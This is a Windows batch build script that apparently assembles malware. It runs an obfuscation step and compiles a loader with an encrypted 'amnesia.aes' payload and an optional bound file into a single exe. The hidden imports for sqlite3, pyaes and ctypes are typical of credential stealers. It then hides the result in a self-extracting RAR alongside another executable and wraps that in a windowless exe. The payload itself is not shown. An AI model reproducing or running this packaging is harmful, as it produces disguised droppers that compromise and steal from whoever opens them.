@echo off
setlocal ENABLEDELAYEDEXPANSION
cls
if not exist activate (
    echo venv not found
    pause
    exit
) else (
    call activate
)
cls
if not exist REQS (
    title Installing requirements...
    where gcc > NUL 2>&1
    if !errorlevel! equ 0 (
        set PYINSTALLER_COMPILE_BOOTLOADER=1
	set PYINSTALLER_BOOTLOADER_WAF_ARGS=--gcc
    ) else (
        set PYINSTALLER_COMPILE_BOOTLOADER=
    )
    
    python -m pip install -r requirements.txt --no-cache-dir --no-binary pyinstaller --verbose
    type NUL > REQS
)
cls
title Obfuscating...
python process.py
title Converting to exe...
if exist "bound.amnesia" (set "bound=--add-data bound.amnesia;.") else (set "bound=")
if exist "noconsole" (set "mode=--noconsole") else (set "mode=--console")
if exist "icon.ico" (set "icon=icon.ico") else (set "icon=NONE")
pyinstaller %mode% --onefile --clean --noconfirm loader-o.py --name "based.exe" -i %icon% --hidden-import urllib3 --hidden-import sqlite3 --hidden-import pyaes --hidden-import ctypes --hidden-import ctypes.wintypes --hidden-import json --add-binary rar.exe;. --add-data rarreg.key;. --add-data amnesia.aes;. --version-file version.txt %bound%
if %errorlevel%==0 (
    cls
    title Post processing...
    python postprocess.py
    cd dist
    start hacn.exe
    rar a -r -sfx -z"xfs.conf" Build hacn.exe based.exe

    pyinstaller -F -w -i icon.ico --add-data "Build.exe;." main.py

    rmdir /s /q __pycache__
    rmdir /s /q build
    rm Build.exe
    rm based.exe
    explorer dist
    exit
) else (
    color 4 && title ERROR
    exit
)
